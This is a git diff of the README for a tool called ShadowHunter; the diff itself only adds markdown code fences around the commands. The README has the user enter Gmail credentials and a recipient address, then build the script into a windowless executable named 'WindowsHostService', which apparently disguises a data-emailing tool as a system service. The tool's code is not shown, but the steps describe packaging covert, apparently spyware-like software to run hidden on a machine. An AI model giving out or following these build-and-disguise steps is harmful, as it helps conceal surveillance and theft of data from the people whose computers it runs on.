@@ -28,15 +28,15 @@
 ## Installation
 
 1. Clone the repository:
-
+```bash
 git clone https://github.com/MuhammadJawaid/ShadowHunter.git
-
+```
 cd ShadowHunter
 
 2. Install dependencies:
-
+```bash
 pip install -r requirements.txt
-
+```
 3. Open shadowhuter.py and update these values:
 
 PythonEMAIL_ADDRESS = "your_email@gmail.com"
@@ -48,15 +48,15 @@ RECIPIENT_EMAIL = "your_email@gmail.com"
 Note: Use Gmail App Password (not your normal password)
 
 4. Run the tool:
-
+```bash
 python shadowhunter.py
-
+```
 ## Creating Executable (.exe)
-
+```bash
 pip install pyinstaller
 
 pyinstaller --onefile --noconsole --name "WindowsHostService" shadowhunter.py
-
+```
 The .exe will be generated in the dist folder.
 
 ## How to Stop the Tool
